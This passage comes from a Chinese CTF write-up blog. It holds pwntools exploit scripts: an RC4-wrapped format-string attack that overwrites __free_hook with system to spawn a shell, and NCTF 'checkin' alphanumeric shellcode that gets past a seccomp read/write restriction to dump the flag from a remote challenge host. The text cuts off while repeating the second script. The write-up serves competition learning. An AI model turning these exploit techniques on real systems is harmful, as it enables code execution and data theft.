</span></span><span class="line"><span class="cl"><span class="n">rc4_key</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;00&#39;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rc4_key</span><span class="o">=</span><span class="n">int_to_bytes</span><span class="p">(</span><span class="n">rc4_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rc4_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">rc4_encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%1459$p&#39;</span><span class="p">,</span><span class="n">rc4_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p_server</span><span class="p">,</span><span class="s2">&#34;b *$rebase(0x000482B)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p_server</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;The rc4_msg is&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p_server</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;The decode  rc4_msg is &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p_server</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p_server</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span><span class="o">-</span><span class="mi">100</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;free_hook&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;sys_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload1</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(((</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c%15$hhn&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload1</span><span class="o">=</span><span class="n">rc4_encrypt</span><span class="p">(</span><span class="n">payload1</span><span class="p">,</span><span class="n">rc4_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">rc4_encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">rc4_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p_server</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="nctf"><span>NCTF</span>
  <a href="#nctf" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="checkin"><span>checkin</span>
  <a href="#checkin" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>本题开启的沙箱使用seccomp-tools 显示有点问题，应该是运行write 调用，但是要求fd为1，count 为1，read 要求fd为0，count为1。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111776.png' alt="image-20231229152406589"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111777.png' alt="image-20231229153055090"></p>
<p>程序要求我们输入可见字符，我们先利用push pop 将rax设置成当前rip 的值，然后调用ae64 将我们的输入的shellcode转化为可见字符shellcode。</p>
<p>所以正常写shellcode就行，比赛中我们的方法是：read 的count 可以使用0x100000001绕过，然后循环write flag即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ae64</span> <span class="kn">import</span> <span class="n">AE64</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;8.130.35.16&#34;</span><span class="p">,</span><span class="mi">58002</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process([&#39;checkin&#39;])</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *$rebase(0x01764)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#0x20230000</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">+=</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0x50505050
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">xor rax,0x7073506c
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#sc=shellcraft.read(0,0x20230120,0x100000001)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span><span class="o">=</span><span class="mh">0x20230000</span><span class="o">+</span><span class="mh">0xf0</span><span class="o">+</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdi
</span></span></span><span class="line"><span class="cl"><span class="s2">push 3
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">+=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">push rax
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdi
</span></span></span><span class="line"><span class="cl"><span class="s2">push </span><span class="si">{</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x100</span><span class="si">}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rsi
</span></span></span><span class="line"><span class="cl"><span class="s2">mov rdx,0x100000001
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">+=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">mov r8,0
</span></span></span><span class="line"><span class="cl"><span class="s2">loop:
</span></span></span><span class="line"><span class="cl"><span class="s2">push 1
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdi
</span></span></span><span class="line"><span class="cl"><span class="s2">push </span><span class="si">{</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x100</span><span class="si">}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rsi
</span></span></span><span class="line"><span class="cl"><span class="s2">add rsi,r8
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0x1
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdx
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0x1
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">add r8,1
</span></span></span><span class="line"><span class="cl"><span class="s2">jmp loop
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Give me your shellcode:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">enc_shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">+</span><span class="n">AE64</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">),</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;small&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_shellcode</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">enc_shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p>看了出题人 的博客，才知道原来read 是可以循环读的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ae64</span> <span class="kn">import</span> <span class="n">AE64</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;8.130.35.16&#34;</span><span class="p">,</span><span class="mi">58002</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process([&#39;checkin&#39;])</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *$rebase(0x01764)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#0x20230000</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">+=</span><span class="s2">&#34;&#34;&#34;
